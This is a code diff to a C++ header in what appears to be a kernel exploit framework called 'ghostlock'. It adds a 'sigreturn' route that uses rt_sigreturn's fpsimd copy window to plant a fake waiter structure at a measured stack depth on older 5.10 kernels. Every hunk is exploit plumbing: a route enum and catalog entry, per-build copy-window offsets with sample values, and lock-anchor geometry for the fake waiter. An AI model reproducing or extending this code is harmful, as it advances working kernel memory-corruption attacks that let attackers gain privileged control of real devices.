@@ -42,6 +42,10 @@ namespace ghostlock::profile {
         TcpZerocopy = 1,
         SelectStack = 2,
         MulticastWaiter = 3,
+        /* A stamp delivered by rt_sigreturn's fpsimd copy instead of the pselect
+         * fd_set buffer; the only route that reaches the pre-5.10.136 waiter
+         * depth. See the fork's docs/analysis/sigreturn-stamp-route-plan.md. */
+        Sigreturn = 4,
     };
 
     /* Wire values for the v2 binary transport and the v1 JSON converter. */
@@ -52,6 +56,8 @@ namespace ghostlock::profile {
             std::to_underlying(RouteKind::SelectStack);
     inline constexpr uint8_t kRouteMulticastWaiter =
             std::to_underlying(RouteKind::MulticastWaiter);
+    inline constexpr uint8_t kRouteSigreturn =
+            std::to_underlying(RouteKind::Sigreturn);
 
     /* Single native route catalog: token <-> wire value. Adding a route means
      * one entry here plus its RoutePolicy / procedure. */
@@ -64,6 +70,7 @@ namespace ghostlock::profile {
         {"tcp_zerocopy", kRouteTcpZerocopy},
         {"select_stack", kRouteSelectStack},
         {"multicast_waiter", kRouteMulticastWaiter},
+        {"sigreturn", kRouteSigreturn},
     };
 
     [[nodiscard]] inline uint8_t route_kind_from_string(std::string_view name) {
@@ -138,6 +145,16 @@ namespace ghostlock::profile {
          * 0x1000 and 0x20. See the geometry check in select_stack_route.cpp. */
         std::optional<uint64_t> select_lock_anchor_bytes;
         std::optional<uint64_t> select_lock_anchor_stride;
+        /* Sigreturn route: where waiter byte 0 sits inside the 0x200-byte fpsimd
+         * copy window `rt_sigreturn`'s restore performs. The value is per build
+         * and per restore helper -- the SVE path copies at sp+0x10, the plain
+         * path at sp+0x00 -- and is derived mechanically:
+         *   waiter_off = chain_sum - dst_offset - waiter_depth
+         * (5.10.81: 0x150 / 0x140; 5.10.236: 0x100 / 0xf0). Absent => this
+         * profile's build has no measured geometry, and the route refuses at
+         * prepare() rather than stamping at an unverified depth. */
+        std::optional<uint64_t> sig_waiter_off_sve;
+        std::optional<uint64_t> sig_waiter_off_plain;
     };
 
     /* Native transport representation of one Kotlin-resolved profile. */
@@ -176,6 +193,18 @@ namespace ghostlock::profile {
 
     struct TcpZerocopyLayout {
         std::optional<uint8_t> compact_waiter;
+    };
+
+    /* The sigreturn route's geometry: the two copy-window offsets, plus the same
+     * anchor keys the select route uses (the lock word is route-independent --
+     * both routes point the fake waiter's `lock` at the same zeroed .bss slot
+     * grid). */
+    struct SigreturnLayout {
+        std::optional<uint64_t> waiter_off_sve;
+        std::optional<uint64_t> waiter_off_plain;
+        std::optional<uint64_t> lock_anchor_image;
+        std::optional<uint64_t> lock_anchor_bytes;
+        std::optional<uint64_t> lock_anchor_stride;
     };
 
 
@@ -321,6 +350,18 @@ namespace ghostlock::profile {
 
         [[nodiscard]] TcpZerocopyLayout tcp_zerocopy_layout() const noexcept {
             return (TcpZerocopyLayout){.compact_waiter = values_.misc.compact_waiter};
+        }
+
+        [[nodiscard]] SigreturnLayout sigreturn_layout() const noexcept {
+            return loaded_
+                       ? (SigreturnLayout){
+                           .waiter_off_sve = values_.geometry.sig_waiter_off_sve,
+                           .waiter_off_plain = values_.geometry.sig_waiter_off_plain,
+                           .lock_anchor_image = values_.geometry.select_lock_anchor_image,
+                           .lock_anchor_bytes = values_.geometry.select_lock_anchor_bytes,
+                           .lock_anchor_stride = values_.geometry.select_lock_anchor_stride,
+                       }
+                       : SigreturnLayout{};
         }
 
         [[nodiscard]] uint32_t or_default(uint32_t value, uint32_t fallback)
